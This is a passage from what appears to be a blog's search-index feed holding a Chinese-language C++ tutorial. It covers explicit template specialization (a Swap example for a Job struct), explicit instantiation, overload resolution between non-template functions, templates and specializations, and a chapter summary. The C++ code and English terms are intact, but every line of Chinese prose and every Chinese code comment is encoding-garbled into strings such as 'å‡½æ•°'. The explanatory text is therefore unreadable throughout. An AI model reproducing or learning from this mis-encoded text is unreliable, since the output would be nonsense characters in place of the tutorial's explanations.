é’ˆå¯¹ specific_type çš„ç‰¹æ®Šå®ç°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>template &lt;&gt;</code>: å‘Šè¯‰ç¼–è¯‘å™¨è¿™æ˜¯ä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–ã€‚</li><li>  <code>function_name&lt;specific_type&gt;</code>: åœ¨å‡½æ•°ååæ˜ç¡®æŒ‡å®šè¦ä¸ºå“ªä¸ªç±»å‹æä¾›å…·ä½“åŒ–ç‰ˆæœ¬ã€‚</li><li>  å‡½æ•°ä½“åŒ…å«é’ˆå¯¹ <code>specific_type</code> çš„ç‰¹æ®Šä»£ç ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šä¸ºç»“æ„ä½“å…·ä½“åŒ– Swap æ¨¡æ¿</strong></p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬åªæƒ³äº¤æ¢å…¶ä¸­çš„æŸä¸ªæˆå‘˜ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç»“æ„ä½“ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Job</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">double</span> salary;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">floor</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šç”¨ Swap æ¨¡æ¿ (åŒä¸Š)</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(T&amp; a, T&amp; b)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using generic Swap)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    T temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é’ˆå¯¹ Job ç±»å‹çš„æ˜¾å¼å…·ä½“åŒ–</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; <span class="comment">// æ˜ç¡®æŒ‡å®š T ä¸º Job</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Using specialized Swap for Job - swapping salary and floor only)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// åªäº¤æ¢ salary å’Œ floor æˆå‘˜</span></span><br><span class="line">    <span class="keyword">double</span> temp_salary = j1.salary;</span><br><span class="line">    j1.salary = j2.salary;</span><br><span class="line">    j2.salary = temp_salary;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> temp_floor = j1.<span class="built_in">floor</span>;</span><br><span class="line">    j1.<span class="built_in">floor</span> = j2.<span class="built_in">floor</span>;</span><br><span class="line">    j2.<span class="built_in">floor</span> = temp_floor;</span><br><span class="line">    <span class="comment">// name æˆå‘˜ä¿æŒä¸å˜</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">10</span>, j = <span class="number">20</span>;</span><br><span class="line">    Swap(i, j); <span class="comment">// è°ƒç”¨é€šç”¨æ¨¡æ¿ Swap&lt;int&gt;</span></span><br><span class="line"></span><br><span class="line">    Job sue = &#123;<span class="string">&quot;Susan Yaffee&quot;</span>, <span class="number">73000.60</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    Job sid = &#123;<span class="string">&quot;Sidney Taffee&quot;</span>, <span class="number">78060.72</span>, <span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nOriginal Jobs:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    Swap(sue, sid); <span class="comment">// è°ƒç”¨æ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ Swap&lt;Job&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSwapped Jobs (partially):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sue.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sue.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sue.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sid.name &lt;&lt; <span class="string">&quot;: $&quot;</span> &lt;&lt; sid.salary &lt;&lt; <span class="string">&quot; on floor &quot;</span> &lt;&lt; sid.<span class="built_in">floor</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç¼–è¯‘å™¨é‡åˆ° <code>Swap(sue, sid)</code> è°ƒç”¨æ—¶ï¼Œå®ƒå‘ç°å­˜åœ¨ä¸€ä¸ªä¸“é—¨ä¸º <code>Job</code> ç±»å‹å®šä¹‰çš„æ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ <code>Swap&lt;Job&gt;</code>ï¼Œäºæ˜¯ä¼˜å…ˆé€‰æ‹©å¹¶è°ƒç”¨è¿™ä¸ªç‰¹æ®Šç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯é€šç”¨çš„æ¨¡æ¿ç‰ˆæœ¬ã€‚</p><h3 id="8-5-4-å®ä¾‹åŒ–å’Œå…·ä½“åŒ–-Instantiation-and-Specialization"><a href="#8-5-4-å®ä¾‹åŒ–å’Œå…·ä½“åŒ–-Instantiation-and-Specialization" class="headerlink" title="8.5.4 å®ä¾‹åŒ–å’Œå…·ä½“åŒ– (Instantiation and Specialization)"></a>8.5.4 å®ä¾‹åŒ–å’Œå…·ä½“åŒ– (Instantiation and Specialization)</h3><p>åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå¾ˆé‡è¦ï¼š</p><ul><li><p><strong>å®ä¾‹åŒ– (Instantiation):</strong> ç¼–è¯‘å™¨æ ¹æ®å‡½æ•°æ¨¡æ¿å’Œè°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹<strong>è‡ªåŠ¨ç”Ÿæˆ</strong>ä¸€ä¸ªç‰¹å®šç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ã€‚è¿™æ˜¯æ¨¡æ¿çš„åŸºæœ¬å·¥ä½œæ–¹å¼ã€‚</p><ul><li>  <strong>éšå¼å®ä¾‹åŒ– (Implicit Instantiation):</strong> ç¼–è¯‘å™¨åœ¨éœ€è¦æ—¶è‡ªåŠ¨è¿›è¡Œï¼ˆå¦‚ <code>Swap(i, j)</code>ï¼‰ã€‚</li><li><strong>æ˜¾å¼å®ä¾‹åŒ– (Explicit Instantiation):</strong> ç¨‹åºå‘˜å¯ä»¥æŒ‡ç¤ºç¼–è¯‘å™¨<strong>ç«‹å³</strong>ç”Ÿæˆç‰¹å®šç±»å‹çš„å‡½æ•°ç‰ˆæœ¬ï¼Œå³ä½¿è¿˜æ²¡æœ‰è°ƒç”¨å®ƒã€‚è¯­æ³•ï¼š<code>template return_type function_name&lt;specific_type&gt;(parameter_list);</code> (æ³¨æ„æœ«å°¾çš„åˆ†å·)ã€‚è¿™åœ¨æŸäº›é«˜çº§åœºæ™¯ï¼ˆå¦‚å°†æ¨¡æ¿å®šä¹‰æ”¾åœ¨æºæ–‡ä»¶ä¸­ï¼‰å¯èƒ½æœ‰ç”¨ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨ .cpp æ–‡ä»¶ä¸­æ˜¾å¼å®ä¾‹åŒ– Swap&lt;int&gt;</span></span><br><span class="line"><span class="keyword">template</span> <span class="keyword">void</span> Swap&lt;<span class="keyword">int</span>&gt;(<span class="keyword">int</span>&amp;, <span class="keyword">int</span>&amp;);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>å…·ä½“åŒ– (Specialization):</strong> ç¨‹åºå‘˜ä¸ºæŸä¸ªç‰¹å®šç±»å‹æä¾›ä¸€ä¸ª<strong>å®Œå…¨ä¸åŒ</strong>çš„ã€<strong>éæ¨¡æ¿</strong>çš„å‡½æ•°å®šä¹‰ï¼Œä»¥è¦†ç›–é€šç”¨çš„æ¨¡æ¿è¡Œä¸ºã€‚</p><ul><li>  <strong>æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization):</strong> ä½¿ç”¨ <code>template &lt;&gt;</code> è¯­æ³•ä¸ºç‰¹å®šç±»å‹æä¾›è‡ªå®šä¹‰å®ç°ï¼ˆå¦‚ä¸Šä¾‹ä¸­çš„ <code>Swap&lt;Job&gt;</code>ï¼‰ã€‚</li></ul></li></ul><h3 id="8-5-5-ç¼–è¯‘å™¨é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬"><a href="#8-5-5-ç¼–è¯‘å™¨é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬" class="headerlink" title="8.5.5 ç¼–è¯‘å™¨é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬"></a>8.5.5 ç¼–è¯‘å™¨é€‰æ‹©ä½¿ç”¨å“ªä¸ªå‡½æ•°ç‰ˆæœ¬</h3><p>å½“å­˜åœ¨å¤šä¸ªå‡½æ•°ï¼ˆæ™®é€šå‡½æ•°ã€å‡½æ•°æ¨¡æ¿ã€æ¨¡æ¿å…·ä½“åŒ–ï¼‰å¯èƒ½åŒ¹é…ä¸€ä¸ªå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¼–è¯‘å™¨éµå¾ªä¸€å¥—è§„åˆ™æ¥é€‰æ‹©æœ€ä½³åŒ¹é…ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**é‡è½½è§£æ (Overload Resolution)**ã€‚ç®€åŒ–è§„åˆ™å¦‚ä¸‹ï¼š</p><ol><li> <strong>å¯»æ‰¾å®Œå…¨åŒ¹é…:</strong> ç¼–è¯‘å™¨é¦–å…ˆæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªéæ¨¡æ¿å‡½æ•°ï¼Œå…¶å‚æ•°ç±»å‹ä¸è°ƒç”¨å®å‚å®Œå…¨åŒ¹é…ï¼ˆæˆ–åªéœ€è¿›è¡Œä¸é‡è¦çš„è½¬æ¢ï¼Œå¦‚æ•°ç»„ååˆ°æŒ‡é’ˆï¼‰ã€‚</li><li><strong>å¯»æ‰¾æ¨¡æ¿åŒ¹é…:</strong> å¦‚æœæ²¡æœ‰æ‰¾åˆ°å®Œå…¨åŒ¹é…çš„éæ¨¡æ¿å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æŸ¥æ‰¾å‡½æ•°æ¨¡æ¿ã€‚<ul><li>  <strong>æŸ¥æ‰¾æ˜¾å¼å…·ä½“åŒ–:</strong> æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ï¼Œå…¶ç±»å‹ä¸å®å‚å®Œå…¨åŒ¹é…ã€‚</li><li>  <strong>å°è¯•æ¨¡æ¿å®ä¾‹åŒ–:</strong> å°è¯•é€šè¿‡å®å‚æ¨å¯¼æ¨¡æ¿å‚æ•°ï¼Œçœ‹æ˜¯å¦èƒ½ä»é€šç”¨æ¨¡æ¿ç”Ÿæˆä¸€ä¸ªåŒ¹é…çš„å®ä¾‹ã€‚</li></ul></li><li><strong>é€‰æ‹©æœ€ä½³åŒ¹é…:</strong><ul><li>  å¦‚æœåªæœ‰ä¸€ä¸ªåŒ¹é…é¡¹ï¼ˆéæ¨¡æ¿å‡½æ•°ã€æ˜¾å¼å…·ä½“åŒ–æˆ–æ¨¡æ¿å®ä¾‹ï¼‰ï¼Œåˆ™é€‰æ‹©è¯¥é¡¹ã€‚</li><li>å¦‚æœå­˜åœ¨å¤šä¸ªåŒ¹é…é¡¹ï¼š<ul><li>  <strong>éæ¨¡æ¿å‡½æ•°ä¼˜å…ˆäºæ¨¡æ¿å®ä¾‹:</strong> å¦‚æœä¸€ä¸ªéæ¨¡æ¿å‡½æ•°å’Œä¸€ä¸ªæ¨¡æ¿å®ä¾‹éƒ½èƒ½åŒ¹é…ï¼Œé€šå¸¸ä¼˜å…ˆé€‰æ‹©éæ¨¡æ¿å‡½æ•°ã€‚</li><li>  <strong>æ˜¾å¼å…·ä½“åŒ–ä¼˜å…ˆäºæ¨¡æ¿å®ä¾‹:</strong> å¦‚æœä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–å’Œä¸€ä¸ªé€šç”¨æ¨¡æ¿å®ä¾‹éƒ½èƒ½åŒ¹é…ï¼Œä¼˜å…ˆé€‰æ‹©æ˜¾å¼å…·ä½“åŒ–ã€‚</li><li>  <strong>æ›´å…·ä½“çš„æ¨¡æ¿ä¼˜å…ˆ:</strong> å¦‚æœæœ‰å¤šä¸ªæ¨¡æ¿å®ä¾‹å¯ä»¥åŒ¹é…ï¼ˆå¯èƒ½æ¶‰åŠç±»å‹è½¬æ¢ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•æ‰¾å‡ºâ€œæœ€å…·ä½“â€çš„æ¨¡æ¿ï¼ˆå³éœ€è¦è¾ƒå°‘æˆ–è¾ƒä¸å¤æ‚çš„ç±»å‹è½¬æ¢å°±èƒ½åŒ¹é…çš„æ¨¡æ¿ï¼‰ã€‚å¦‚æœæ— æ³•ç¡®å®šå“ªä¸ªæœ€å…·ä½“ï¼Œåˆ™è°ƒç”¨æ˜¯**æ­§ä¹‰çš„ (ambiguous)**ï¼Œä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚</li></ul></li></ul></li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. éæ¨¡æ¿å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Non-template Show(int): &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. é€šç”¨å‡½æ•°æ¨¡æ¿</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Show</span><span class="params">(T t)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Template Show(T): &quot;</span> &lt;&lt; t &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. æ˜¾å¼å…·ä½“åŒ–</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="keyword">void</span> Show&lt;<span class="keyword">double</span>&gt;(<span class="keyword">double</span> d) &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Specialized Show&lt;double&gt;: &quot;</span> &lt;&lt; d &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    Show(a); <span class="comment">// ä¼˜å…ˆåŒ¹é… 1 (éæ¨¡æ¿å‡½æ•°)</span></span><br><span class="line">    Show(b); <span class="comment">// ä¼˜å…ˆåŒ¹é… 3 (æ˜¾å¼å…·ä½“åŒ–)</span></span><br><span class="line">    Show(c); <span class="comment">// åŒ¹é… 2 (é€šç”¨æ¨¡æ¿å®ä¾‹åŒ– Show&lt;char&gt;)</span></span><br><span class="line">    Show&lt;&gt;(a); <span class="comment">// ä½¿ç”¨ &lt;&gt; å¼ºåˆ¶ç¼–è¯‘å™¨åªè€ƒè™‘æ¨¡æ¿ç‰ˆæœ¬ï¼ŒåŒ¹é… 2 (é€šç”¨æ¨¡æ¿å®ä¾‹åŒ– Show&lt;int&gt;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-5-6-æ¨¡æ¿å‡½æ•°çš„å‘å±•"><a href="#8-5-6-æ¨¡æ¿å‡½æ•°çš„å‘å±•" class="headerlink" title="8.5.6 æ¨¡æ¿å‡½æ•°çš„å‘å±•"></a>8.5.6 æ¨¡æ¿å‡½æ•°çš„å‘å±•</h3><p>å‡½æ•°æ¨¡æ¿æ˜¯ C++ æ³›å‹ç¼–ç¨‹çš„åŸºç¡€ã€‚è‡ª C++11 ä»¥æ¥ï¼Œæ¨¡æ¿åŠŸèƒ½å¾—åˆ°äº†è¿›ä¸€æ­¥å¢å¼ºï¼š</p><ul><li>  <strong><code>auto</code> è¿”å›ç±»å‹æ¨å¯¼:</strong> å…è®¸ç¼–è¯‘å™¨æ ¹æ® <code>return</code> è¯­å¥æ¨å¯¼å‡½æ•°æ¨¡æ¿çš„è¿”å›ç±»å‹ã€‚</li><li>  <strong>å¯å˜å‚æ•°æ¨¡æ¿ (Variadic Templates):</strong> å…è®¸å®šä¹‰æ¥å—ä»»æ„æ•°é‡ã€ä»»æ„ç±»å‹å‚æ•°çš„æ¨¡æ¿ï¼ˆè§ 18.6 èŠ‚ï¼‰ã€‚</li><li>  <strong>åˆ«åæ¨¡æ¿ (<code>using</code>):</strong> å¯ä»¥ä¸ºæ¨¡æ¿åˆ›å»ºåˆ«åã€‚</li><li>  <strong>Lambda è¡¨è¾¾å¼:</strong> å¯ä»¥åˆ›å»ºåŒ¿åçš„å‡½æ•°å¯¹è±¡ï¼Œå¸¸ä¸æ¨¡æ¿ç®—æ³•ç»“åˆä½¿ç”¨ã€‚</li><li>  <strong>Concepts (C++20):</strong> å…è®¸å¯¹æ¨¡æ¿å‚æ•°æ–½åŠ æ›´æ˜ç¡®çš„çº¦æŸï¼Œæé«˜äº†ç¼–è¯‘æ—¶é”™è¯¯ä¿¡æ¯çš„å¯è¯»æ€§ï¼Œå¹¶ä½¿æ¨¡æ¿æ„å›¾æ›´æ¸…æ™°ã€‚</li></ul><p>å‡½æ•°æ¨¡æ¿æ˜¯ C++ ä¸­ä¸€ä¸ªéå¸¸å¼ºå¤§å’Œçµæ´»çš„ç‰¹æ€§ï¼Œå®ƒä½¿å¾—ç¼–å†™é«˜åº¦é€šç”¨å’Œå¯é‡ç”¨çš„ä»£ç æˆä¸ºå¯èƒ½ã€‚</p><h2 id="8-6-æ€»ç»“"><a href="#8-6-æ€»ç»“" class="headerlink" title="8.6 æ€»ç»“"></a>8.6 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº† C++ å‡½æ•°çš„æ›´å¤šé«˜çº§ç‰¹æ€§ï¼Œæ—¨åœ¨æé«˜ä»£ç çš„æ•ˆç‡ã€çµæ´»æ€§å’Œå¯é‡ç”¨æ€§ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>å†…è”å‡½æ•° (<code>inline</code>)</strong>:</p><ul><li>  ä¸€ç§ä¼˜åŒ–å»ºè®®ï¼Œè¯·æ±‚ç¼–è¯‘å™¨å°†å‡½æ•°ä»£ç ç›´æ¥æ›¿æ¢åˆ°è°ƒç”¨ç‚¹ï¼Œä»¥å‡å°‘å°å‹ã€é¢‘ç¹è°ƒç”¨å‡½æ•°çš„è°ƒç”¨å¼€é”€ã€‚</li><li>  <code>inline</code> åªæ˜¯å»ºè®®ï¼Œç¼–è¯‘å™¨å¯è‡ªè¡Œå†³å®šæ˜¯å¦é‡‡çº³ã€‚</li><li>  é€šå¸¸å°†å†…è”å‡½æ•°å®šä¹‰æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ã€‚</li><li>  ç›¸æ¯”å®ï¼Œå†…è”å‡½æ•°å…·æœ‰ç±»å‹å®‰å…¨ã€è¡Œä¸ºå¯é¢„æµ‹ç­‰ä¼˜ç‚¹ã€‚</li></ul></li><li><p><strong>å¼•ç”¨å˜é‡ (<code>&amp;</code>)</strong>:</p><ul><li>  å˜é‡çš„åˆ«åï¼Œå£°æ˜æ—¶å¿…é¡»åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½å†å¼•ç”¨å…¶ä»–å˜é‡ã€‚</li><li>  <strong>æŒ‰å¼•ç”¨ä¼ é€’</strong> (<code>type&amp;</code>)ï¼šå‡½æ•°å‚æ•°æˆä¸ºåŸå§‹å®å‚çš„åˆ«åï¼Œå…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹æ•°æ®ï¼Œä¸”é¿å…äº†å¤§å‹å¯¹è±¡çš„å¤åˆ¶å¼€é”€ã€‚</li><li>  <strong>æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’</strong> (<code>const type&amp;</code>)ï¼šå‡½æ•°å‚æ•°æˆä¸ºåŸå§‹å®å‚çš„å¸¸é‡åˆ«åï¼Œä¸èƒ½é€šè¿‡å¼•ç”¨ä¿®æ”¹åŸå§‹æ•°æ®ï¼Œä½†åŒæ ·é¿å…äº†å¤åˆ¶å¼€é”€ã€‚è¿™æ˜¯ä¼ é€’å¤§å‹å¯¹è±¡è¿›è¡Œåªè¯»è®¿é—®çš„æ¨èæ–¹å¼ã€‚</li><li>  å¼•ç”¨æ¯”æŒ‡é’ˆåœ¨è¯­æ³•ä¸Šæ›´ç®€æ´ï¼Œä¸”é€šå¸¸ä¸æ¶‰åŠç©ºå€¼é—®é¢˜ã€‚</li></ul></li><li><p><strong>é»˜è®¤å‚æ•°</strong>:</p><ul><li>  å…è®¸åœ¨å‡½æ•°å£°æ˜ï¼ˆåŸå‹ï¼‰ä¸­ä¸ºå‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚</li><li>  è°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœçœç•¥äº†å¸¦æœ‰é»˜è®¤å€¼çš„å‚æ•°ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ã€‚</li><li>  é»˜è®¤å‚æ•°å¿…é¡»ä»å‚æ•°åˆ—è¡¨çš„æœ€å³è¾¹å¼€å§‹æŒ‡å®šã€‚</li><li>  ç®€åŒ–äº†å‡½æ•°è°ƒç”¨ï¼Œæé«˜äº†å‡½æ•°çš„çµæ´»æ€§ã€‚</li></ul></li><li><p><strong>å‡½æ•°é‡è½½</strong>:</p><ul><li>  å…è®¸åœ¨åŒä¸€ä½œç”¨åŸŸå†…å®šä¹‰å¤šä¸ªåŒåå‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„<strong>å‚æ•°åˆ—è¡¨</strong>ï¼ˆæ•°é‡ã€ç±»å‹ã€é¡ºåºï¼‰ä¸åŒã€‚</li><li>  ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶çš„å®å‚æ¥é€‰æ‹©åŒ¹é…çš„é‡è½½ç‰ˆæœ¬ã€‚</li><li>  è¿”å›ç±»å‹<strong>ä¸èƒ½</strong>ä½œä¸ºåŒºåˆ†é‡è½½å‡½æ•°çš„ä¾æ®ã€‚</li><li>  é€‚ç”¨äºæ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼ä½†å¤„ç†ä¸åŒå‚æ•°çš„ä»»åŠ¡ã€‚</li></ul></li><li><p><strong>å‡½æ•°æ¨¡æ¿ (<code>template &lt;typename T&gt;</code>)</strong>:</p><ul><li>  åˆ›å»ºé€šç”¨çš„ã€ä¸ç±»å‹æ— å…³çš„å‡½æ•°å®šä¹‰ã€‚</li><li>  ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹<strong>å®ä¾‹åŒ–</strong>ç›¸åº”çš„å‡½æ•°ç‰ˆæœ¬ã€‚</li><li>  <strong>é‡è½½æ¨¡æ¿</strong>: å¯ä»¥å®šä¹‰å¤šä¸ªåŒåæ¨¡æ¿ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨æˆ–æ¨¡æ¿å‚æ•°åˆ—è¡¨ä¸åŒã€‚</li><li>  <strong>æ˜¾å¼å…·ä½“åŒ– (<code>template &lt;&gt;</code>)</strong>: ä¸ºç‰¹å®šç±»å‹æä¾›ä¸“é—¨çš„ã€éæ¨¡æ¿çš„å®ç°ï¼Œä»¥è¦†ç›–é€šç”¨æ¨¡æ¿çš„è¡Œä¸ºã€‚</li><li>  æ¨¡æ¿æ˜¯ C++ æ³›å‹ç¼–ç¨‹çš„åŸºç¡€ï¼Œæå¤§åœ°æé«˜äº†ä»£ç çš„å¯é‡ç”¨æ€§ã€‚</li></ul></li></ol><p>é€šè¿‡æŒæ¡è¿™äº›é«˜çº§å‡½æ•°ç‰¹æ€§ï¼Œå¯ä»¥ç¼–å†™å‡ºæ›´é«˜æ•ˆã€æ›´çµæ´»ã€æ›´æ˜“äºç»´æŠ¤çš„ C++ ä»£ç ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 7 å‡½æ•°â€”â€”C++çš„ç¼–ç¨‹æ¨¡å—</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_7/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_7/</url>
      
